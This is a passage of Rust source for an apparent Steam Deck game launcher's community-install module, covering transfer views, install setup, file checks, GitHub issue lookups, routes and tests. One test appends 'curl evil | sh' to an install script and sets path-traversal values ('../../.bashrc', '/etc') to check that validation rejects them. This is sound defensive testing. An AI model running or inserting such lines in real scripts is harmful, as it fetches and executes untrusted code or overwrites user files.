    let installed = r.stage == Stage::Installed || library::get(&library::community_key(id)).is_some_and(|e| e.install.is_some_and(|s| s.appid.is_some()));
    if !installed {
        let game_dir = PathBuf::from(&r.game_dir);
        // Only the folder piShop made for it, inside a library's piShop folder.
        if r.created_dir && game_dir.parent().is_some_and(|p| p.ends_with(crate::APP_NAME)) {
            let _ = std::fs::remove_dir_all(&game_dir);
        }
        library::remove(&library::community_key(id));
    }
    {
        let mut map = RECORDS.lock().unwrap();
        map.remove(id);
        persist(&map);
    }
    LOGS.lock().unwrap().remove(id);
    let _ = std::fs::remove_dir_all(dir().join(id));
    log!("comunidade: {id} removido das transferências (apagar: {delete}, instalado: {installed})");
    Ok(json!({ "freed": freed }))
}

// ---------- views ----------

fn host(u: &str) -> String {
    u.split("://").nth(1).and_then(|r| r.split('/').next()).unwrap_or_default().to_string()
}

/// A manifest for the UI: no script text, sources reduced to what to show.
fn public(m: &Manifest) -> Value {
    let mut v = serde_json::to_value(m).unwrap_or(Value::Null);
    if let Some(i) = v.get_mut("install") {
        i["source"] = Value::Null;
    }
    let parts: Vec<Value> = m
        .parts
        .iter()
        .map(|p| {
            let (kind, from) = source_label(&p.source);
            let mut x = serde_json::to_value(p).unwrap_or(Value::Null);
            x["kind"] = json!(kind);
            x["from"] = json!(from);
            x
        })
        .collect();
    v["parts"] = json!(parts);
    v
}

/// (kind, where from) for the UI: "direct" itch.io, "torrent" archive.org, "user"…
fn source_label(s: &PartSource) -> (&'static str, String) {
    match s {
        PartSource::Http { urls, .. } => ("direct", urls.first().map(|u| host(u)).unwrap_or_default()),
        PartSource::Itch { .. } => ("itch", "itch.io".into()),
        PartSource::Github { repo, .. } => ("github", format!("github.com/{repo}")),
        PartSource::Torrent { urls, .. } => ("torrent", urls.first().map(|u| host(u)).unwrap_or_else(|| "magnet".into())),
        PartSource::User { .. } => ("user", String::new()),
    }
}

fn status_of(id: &str) -> Value {
    let key = library::community_key(id);
    let installed = library::get(&key).and_then(|e| e.install).filter(|s| s.appid.is_some());
    match record(id) {
        Some(r) if r.stage != Stage::Installed => {
            let v = view(&r);
            json!({ "state": "installing", "stage": r.stage, "progress": v["progress"], "key": key, "appid": installed.and_then(|s| s.appid) })
        }
        _ => match installed {
            Some(s) => json!({ "state": "installed", "key": key, "appid": s.appid, "game_dir": s.game_dir }),
            None => json!({ "state": "none" }),
        },
    }
}

/// An install as Transfers shows it: the game, its step, each part's progress.
fn view(r: &Record) -> Value {
    let key = library::community_key(&r.id);
    let game = library::get(&key).map(|e| e.game);
    let live = LIVE.lock().unwrap().clone();
    let mut done_all = 0u64;
    let mut total_all = 0u64;
    let mut speed_all = 0f64;
    let parts: Vec<Value> = r
        .parts
        .iter()
        .map(|p| {
            let s = spec(r, &p.id);
            let (mut done, mut total, mut speed) = (0u64, p.size.or(s.and_then(|s| s.size)).unwrap_or(0), 0f64);
            let mut paused = false;
            let mut connections = 0usize;
            let copy = p.copy.and_then(|j| crate::jobs::list().into_iter().find(|x| x.id == j));
            if let Some(j) = copy.as_ref().filter(|_| p.state == PartState::Copying) {
                done = j.done_bytes;
                total = if j.total_bytes > 0 { j.total_bytes } else { total };
                speed = j.speed;
            } else if let Some(d) = p.direct.and_then(direct::get) {
                done = d.done;
                total = if d.total > 0 { d.total } else { total };
                speed = d.speed;
                paused = d.state == direct::State::Paused;
                connections = d.connections;
            } else if let Some((d, t, sp, _)) = p.torrent.as_ref().and_then(|h| live.get(h)) {
                done = *d;
                total = if *t > 0 { *t } else { total };
                speed = *sp;
            }
            if matches!(p.state, PartState::Ready | PartState::Verifying) {
                done = total.max(done);
            }
            let user = s.is_some_and(|s| matches!(s.source, PartSource::User { .. }));
            if !user && !p.provided {
                done_all += done;
                total_all += total;
                speed_all += speed;
            }
            let (kind, from) = s.map(|s| source_label(&s.source)).unwrap_or(("direct", String::new()));
            json!({
                "id": p.id,
                "name": s.map(|s| s.name.clone()).unwrap_or_default(),
                "description": s.map(|s| s.description.clone()).unwrap_or_default(),
                "role": s.map(|s| s.role.clone()).unwrap_or_default(),
                "kind": if p.provided { "user" } else { kind },
                "from": from,
                "state": p.state,
                "paused": paused || (r.paused && p.state == PartState::Downloading),
                "done": done,
                "total": total,
                "speed": speed,
                "error": p.error,
                "path": p.path,
                "provided": p.provided,
                "verify": p.verify,
                "extract": s.and_then(|s| s.extract.clone()),
                "extracted": p.extracted,
                "hint": s.and_then(|s| match &s.source { PartSource::User { hint, .. } => Some(hint.clone()), _ => None }),
                "extensions": s.map(|s| match &s.source { PartSource::User { extensions, .. } => extensions.clone(), _ => Vec::new() }).unwrap_or_default(),
                "resumable": s.is_some_and(|s| matches!(s.source, PartSource::Http { .. } | PartSource::Itch { .. })),
                "torrent": p.torrent,
                "connections": connections,
                "copying_from": copy.map(|j| j.source_name),
            })
        })
        .collect();
    let progress = match r.stage {
        Stage::Downloading if total_all > 0 => json!(done_all as f64 / total_all as f64),
        Stage::Downloading => json!(0),
        Stage::Installed => json!(1),
        _ => json!(r.progress),
    };
    json!({
        "id": r.id,
        "key": key,
        "name": game.as_ref().map(|g| g.name.clone()).unwrap_or_else(|| r.manifest.name.clone()),
        "platform": r.manifest.platform,
        "wrapper": r.manifest.wrapper,
        "game": game,
        "stage": r.stage,
        "failed_at": r.failed_at,
        "error": r.error,
        "step": r.step,
        "progress": progress,
        "paused": r.paused,
        "done": done_all,
        "total": total_all,
        "speed": speed_all,
        "parts": parts,
        "game_dir": r.game_dir,
        "downloads": r.downloads,
        "library": r.library,
        "tool": r.tool,
        "runtime": r.manifest.launch.runtime,
        "appid": r.appid,
        "added": r.added,
        "finished": r.finished,
        "script_running": SCRIPTS.lock().unwrap().contains_key(&r.id),
        "log": log_tail(&r.id, 60),
    })
}

/// Every install in Transfers, newest first.
fn installs() -> Vec<Value> {
    let mut list: Vec<Record> = RECORDS.lock().unwrap().values().cloned().collect();
    list.sort_by_key(|r| -r.added);
    list.iter().map(view).collect()
}

/// What the install dialog needs: where it can go, which Proton, the space.
async fn setup(id: &str) -> anyhow::Result<Value> {
    let m = manifest(id).await?;
    let api = steamclient::available().await;
    let tools = if api { install::tools().await.unwrap_or_default() } else { Vec::new() };
    let preferred = m.launch.proton.clone().filter(|p| tools.iter().any(|t| t.name == *p));
    let default_tool = preferred.or_else(|| install::default_tool(&tools));
    let libs = install::libraries();
    let default_library = libs.iter().max_by_key(|l| l.free.unwrap_or(0)).map(|l| l.path.clone());
    let downloads = torrent::download_dir().join("Community").join(&m.id);
    let existing = downloads.ancestors().find(|a| a.exists()).unwrap_or(Path::new("/")).to_path_buf();
    let space = localfs::disk_space(&existing);
    let download_size: u64 = m.parts.iter().filter(|p| !matches!(p.source, PartSource::User { .. })).filter_map(|p| p.size).sum();
    Ok(json!({
        "game": public(&m),
        "folder": install::folder_name(&m.name),
        "libraries": libs,
        "default_library": default_library,
        "tools": tools,
        "default_tool": default_tool,
        "steam_api": api,
        "debugging_enabled": steamclient::debugging_enabled(),
        "bwrap": find_bwrap().is_some(),
        "downloads": { "path": downloads, "free": space.map(|s| s.0), "total": space.map(|s| s.1), "disk": install::disk_label(&existing) },
        "download_size": download_size,
        "install_size": m.install.disk,
        "status": status_of(&m.id),
    }))
}

/// A user file picked in the install dialog, checked before the install
/// starts (size, extension; the checksum when it's small).
fn check_file(m: &Manifest, part: &str, path: &str) -> anyhow::Result<Value> {
    let s = m.parts.iter().find(|p| p.id == part).ok_or_else(|| anyhow!(tr!("no such part", "parte não encontrada")))?;
    let file = PathBuf::from(path);
    let meta = std::fs::metadata(&file).map_err(|_| anyhow!(tr!("file not found", "arquivo não encontrado")))?;
    if let PartSource::User { extensions, .. } = &s.source {
        let low = path.to_lowercase();
        if !extensions.is_empty() && !extensions.iter().any(|x| low.ends_with(&x.to_lowercase())) {
            bail!(tr!("this part takes a {} file", "esta parte aceita um arquivo {}", extensions.join(" / ")));
        }
    }
    if let Some(want) = s.size
        && meta.len() > want
    {
        bail!(tr!("this file is bigger than the part", "este arquivo é maior que a parte"));
    }
    let partial = s.size.is_some_and(|w| meta.len() < w);
    let resumable = matches!(s.source, PartSource::Http { .. } | PartSource::Itch { .. } | PartSource::Github { .. });
    if partial && !(resumable && looks_partial(s, &file)) {
        bail!(tr!("this file is smaller than the part", "este arquivo é menor que a parte"));
    }
    let small = meta.len() <= 512 << 20;
    if small && !partial {
        check(&file, &s.checksums, |_| {})?;
    }
    Ok(json!({ "size": meta.len(), "verified": small && !partial && !s.checksums.is_empty(), "partial": partial }))
}

// ---------- troubleshooting (GitHub issues) ----------

/// Issues and comments, cached ten minutes: GitHub allows 60 requests an hour
/// without a login.
static GH_CACHE: LazyLock<Mutex<HashMap<String, (Instant, Value)>>> = LazyLock::new(Default::default);

async fn github(path: &str) -> anyhow::Result<Value> {
    if let Some((at, v)) = GH_CACHE.lock().unwrap().get(path)
        && at.elapsed() < FRESH
    {
        return Ok(v.clone());
    }
    let r = HTTP
        .get(format!("https://api.github.com/repos/{REPO}/{path}"))
        .header("Accept", "application/vnd.github+json")
        .timeout(Duration::from_secs(20))
        .send()
        .await
        .context(tr!("GitHub didn't answer", "o GitHub não respondeu"))?;
    if r.status().as_u16() == 403 || r.status().as_u16() == 429 {
        bail!(tr!("GitHub's limit for this hour was reached; try again later", "o limite do GitHub para esta hora acabou; tente mais tarde"));
    }
    let v: Value = r.error_for_status()?.json().await?;
    GH_CACHE.lock().unwrap().insert(path.to_string(), (Instant::now(), v.clone()));
    Ok(v)
}

fn clip(s: &str, max: usize) -> String {
    let s = s.trim();
    if s.chars().count() <= max { s.to_string() } else { format!("{}…", s.chars().take(max).collect::<String>()) }
}

/// The issue form, prefilled for this game.
fn new_issue_url(m: &Manifest) -> String {
    let enc = |s: &str| -> String {
        s.bytes()
            .map(|b| if b.is_ascii_alphanumeric() || b"-_.~".contains(&b) { (b as char).to_string() } else { format!("%{b:02X}") })
            .collect()
    };
    format!(
        "https://github.com/{REPO}/issues/new?template={ISSUE_FORM}&title={}&game={}&sgdb={}&community={}",
        enc(&format!("[{}] ", m.name)),
        enc(&m.name),
        m.art.sgdb_id.map(|i| i.to_string()).unwrap_or_default(),
        enc(&m.id)
    )
}

/// Troubleshooting: the issues about this game (labelled `sgdb:<id>` by the
/// repository's workflow from the form's SteamGridDB field).
async fn issues(id: &str) -> anyhow::Result<Value> {
    let m = manifest(id).await?;
    let new_issue = new_issue_url(&m);
    let Some(sgdb) = m.art.sgdb_id else {
        return Ok(json!({ "issues": [], "new_issue": new_issue, "label": null }));
    };
    let label = format!("sgdb:{sgdb}");
    let enc_label = label.replace(':', "%3A");
    let v = github(&format!("issues?labels={enc_label}&state=all&per_page=30&sort=updated")).await?;
    let list: Vec<Value> = v
        .as_array()
        .into_iter()
        .flatten()
        .filter(|i| i.get("pull_request").is_none())
        .map(|i| {
            json!({
                "number": i["number"],
                "title": i["title"],
                "state": i["state"],
                "comments": i["comments"],
                "user": i["user"]["login"],
                "created": i["created_at"],
                "updated": i["updated_at"],
                "body": clip(i["body"].as_str().unwrap_or_default(), 6000),
                "url": i["html_url"],
                "labels": i["labels"].as_array().map(|l| l.iter().filter_map(|x| x["name"].as_str()).map(String::from).collect::<Vec<_>>()).unwrap_or_default(),
            })
        })
        .collect();
    Ok(json!({ "issues": list, "new_issue": new_issue, "label": label }))
}

async fn comments(number: u64) -> anyhow::Result<Value> {
    let v = github(&format!("issues/{number}/comments?per_page=100")).await?;
    let list: Vec<Value> = v
        .as_array()
        .into_iter()
        .flatten()
        .map(|c| json!({ "user": c["user"]["login"], "created": c["created_at"], "body": clip(c["body"].as_str().unwrap_or_default(), 6000) }))
        .collect();
    Ok(json!(list))
}

/// Opens a page of piShop's repository in Steam's browser (Game Mode's overlay).
fn open_url(url: &str) -> anyhow::Result<Value> {
    let ok = url.starts_with(&format!("https://github.com/{REPO}/")) || url == format!("https://github.com/{REPO}");
    if !ok {
        bail!(tr!("only piShop's GitHub pages open from here", "só páginas do piShop no GitHub abrem daqui"));
    }
    std::process::Command::new("steam")
        .arg(format!("steam://openurl/{url}"))
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .context(tr!("couldn't reach Steam", "não foi possível falar com a Steam"))?;
    Ok(json!({}))
}

// ---------- routes ----------

#[derive(Deserialize)]
struct ListQuery {
    #[serde(default)]
    fresh: bool,
}

async fn list_route(Query(q): Query<ListQuery>) -> Response {
    reply(async {
        let (games, warning) = catalog(q.fresh).await?;
        let list: Vec<Value> = games
            .iter()
            .map(|m| {
                let mut v = public(m);
                v["status"] = status_of(&m.id);
                v
            })
            .collect();
        anyhow::Ok(json!({ "games": list, "warning": warning, "source": catalog_url(), "default_source": DEFAULT_URL, "contribute": format!("https://github.com/{REPO}/tree/main/community") }))
    }
    .await)
}

async fn script_route(UrlPath(id): UrlPath<String>) -> Response {
    reply(async {
        let m = manifest(&id).await?;
        anyhow::Ok(json!({ "name": m.install.script, "source": m.install.source, "sha256": m.install.sha256, "revision": m.revision }))
    }
    .await)
}

#[derive(Deserialize)]
struct FileReq {
    path: String,
}

#[derive(Deserialize)]
struct RemoveReq {
    #[serde(default)]
    delete: bool,
}

#[derive(Deserialize)]
struct UrlReq {
    url: String,
}

pub fn router() -> Router {
    Router::new()
        .route("/api/community", get(list_route))
        .route("/api/community/installs", get(|| async { Json(installs()) }))
        .route("/api/community/open", post(|Json(r): Json<UrlReq>| async move { reply(open_url(&r.url)) }))
        .route("/api/community/issues/{number}/comments", get(|UrlPath(n): UrlPath<u64>| async move { reply(comments(n).await) }))
        .route("/api/community/{id}/script", get(script_route))
        .route("/api/community/{id}/setup", get(|UrlPath(id): UrlPath<String>| async move { reply(setup(&id).await) }))
        .route("/api/community/{id}/issues", get(|UrlPath(id): UrlPath<String>| async move { reply(issues(&id).await) }))
        .route(
            "/api/community/{id}/check/{part}",
            post(|UrlPath((id, part)): UrlPath<(String, String)>, Json(r): Json<FileReq>| async move {
                reply(async { check_file(&manifest(&id).await?, &part, &r.path) }.await)
            }),
        )
        .route(
            "/api/community/{id}/install",
            post(|UrlPath(id): UrlPath<String>, Json(r): Json<InstallReq>| async move { reply(begin_install(&id, r).await) }),
        )
        .route(
            "/api/community/installs/{id}/parts/{part}",
            post(|UrlPath((id, part)): UrlPath<(String, String)>, Json(r): Json<FileReq>| async move {
                reply(provide(&id, &part, &r.path).map(|_| json!({})))
            }),
        )
        .route(
            "/api/community/installs/{id}/parts/{part}/source",
            post(|UrlPath((id, part)): UrlPath<(String, String)>, Json(pick): Json<SourcePick>| async move {
                reply(provide_from_source(&id, &part, &pick).map(|_| json!({})))
            }),
        )
        .route(
            "/api/community/installs/{id}/remove",
            post(|UrlPath(id): UrlPath<String>, Json(r): Json<RemoveReq>| async move { reply(remove(&id, r.delete).await) }),
        )
        .route("/api/community/installs/{id}/{action}", post(action_route))
}

async fn action_route(UrlPath((id, action)): UrlPath<(String, String)>) -> Response {
    let r = match action.as_str() {
        "pause" => set_paused(&id, true).await,
        "resume" => set_paused(&id, false).await,
        "retry" => retry(&id).await,
        _ => Err(anyhow!(tr!("unknown action", "ação desconhecida"))),
    };
    reply(r.map(|_| record(&id).map(|r| view(&r)).unwrap_or(Value::Null)))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample() -> Manifest {
        let script = "#!/usr/bin/env bash\necho ok\n";
        serde_json::from_value(json!({
            "id": "azimuth-forza-horizon-2",
            "name": "Forza Horizon 2",
            "platform": "Xbox One",
            "art": { "sgdb_id": 5246839 },
            "parts": [
                { "id": "launcher", "name": "Azimuth", "source": { "type": "itch", "page": "https://almost-there-games.itch.io/azimuth", "upload_id": 19662858, "file": "azimuth-windows.zip" }, "extract": "" },
                { "id": "game", "name": "Forza Horizon 2", "size": 10, "checksums": { "sha1": "a93149fbb0eae3a2d7df88666a99f1bc47603667" },
                  "source": { "type": "http", "urls": ["https://archive.org/download/x/y.rar"], "file": "y.rar" }, "extract": "Game" },
                { "id": "rom", "name": "ROM", "source": { "type": "user", "extensions": [".z64"] }, "checksums": { "md5": ["a", "b"] } }
            ],
            "install": { "script": "install.sh", "source": script, "sha256": sha256_hex(script.as_bytes()) },
            "launch": { "exe": "azimuth.exe" },
            "patches": [{ "id": "sdl", "title": "x", "env": { "SDL_GAMECONTROLLER_IGNORE_DEVICES": "0x0079/0x0006" } }]
        }))
        .unwrap()
    }

    #[test]
    fn manifests_are_checked() {
        let m = sample();
        validate(&m).unwrap();
        assert_eq!(m.parts[2].checksums.md5, ["a", "b"]);
        assert_eq!(m.launch.runtime, "proton");
        let mut bad = m.clone();
        bad.launch.exe = "../../.bashrc".into();
        assert!(validate(&bad).is_err());
        let mut bad = m.clone();
        bad.parts[1].extract = Some("/etc".into());
        assert!(validate(&bad).is_err());
        let mut bad = m.clone();
        bad.install.source.push_str("curl evil | sh\n");
        assert!(validate(&bad).is_err(), "a script changed after review");
        let mut bad = m;
        bad.id = "Bad Id".into();
        assert!(validate(&bad).is_err());
    }

    #[test]
    fn only_unfinished_downloads_continue() {
        let m = sample();
        let game = &m.parts[1];
        assert!(looks_partial(game, Path::new("/home/deck/Downloads/Unconfirmed 798233.crdownload")));
        assert!(looks_partial(game, Path::new("/x/y.rar.part")));
        assert!(looks_partial(game, Path::new("/x/Y.RAR")));
        assert!(!looks_partial(game, Path::new("/home/deck/Videos/clip.mkv")), "a small file picked by mistake is never taken over");
        assert!(!looks_partial(&m.parts[2], Path::new("/x/rom.z64.part")), "a user part is never a partial download");
    }

    #[test]
    fn checksums_any_of_them() {
        let dir = std::env::temp_dir().join(format!("pishop-cm-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let f = dir.join("rom.z64");
        std::fs::write(&f, b"hello").unwrap();
        let sums = Checksums { md5: vec!["nope".into(), "5D41402ABC4B2A76B9719D911017C592".into()], ..Default::default() };
        check(&f, &sums, |_| {}).unwrap();
        let sums = Checksums { sha1: vec!["aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d".into()], sha256: vec!["0".into()], ..Default::default() };
        assert!(check(&f, &sums, |_| {}).is_err());
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn script_output_drives_the_ui() {
        assert_eq!(part_var("game-files"), "PISHOP_PART_GAME_FILES");
        let a = sandbox_args(Path::new("/g"), &[PathBuf::from("/d/x.rar")], Path::new("/s"), Path::new("/w/install.sh"));
        let joined = a.join(" ");
        assert!(joined.contains("--unshare-all"));
        assert!(joined.contains("--ro-bind /d/x.rar /d/x.rar"));
        assert!(joined.contains("--bind /g /g"));
        // Hidden first, then /tmp, then what the script may use.
        let hide = a.iter().rposition(|x| x == "--tmpfs");
        let tmp = a.windows(3).position(|w| w == ["--bind", "/s", "/tmp"]).unwrap();
        let game = a.iter().rposition(|x| x == "/g").unwrap();
        assert!(hide.is_none_or(|h| h < tmp) && tmp < game);
    }

    #[test]
    fn the_repository_catalog_parses() {
        // community/index.json as scripts/community.mjs writes it.
        let bytes = std::fs::read(concat!(env!("CARGO_MANIFEST_DIR"), "/../community/index.json")).unwrap();
        let raw: Index = serde_json::from_slice(&bytes).unwrap();
        let games = parse_index(&bytes).unwrap();
        assert_eq!(games.len(), raw.games.len(), "every game in the index is valid for the launcher");
        let fh2 = games.iter().find(|g| g.id == "azimuth-forza-horizon-2").unwrap();
        assert_eq!(fh2.art.sgdb_id, Some(5246839));
        assert_eq!(fh2.parts[1].checksums.sha1.len(), 1);
    }

    #[test]
    fn issue_link_prefills_the_form() {
        let u = new_issue_url(&sample());
        assert!(u.contains("template=community.yml"));
        assert!(u.contains("sgdb=5246839"));
        assert!(u.contains("game=Forza%20Horizon%202"));
    }
}
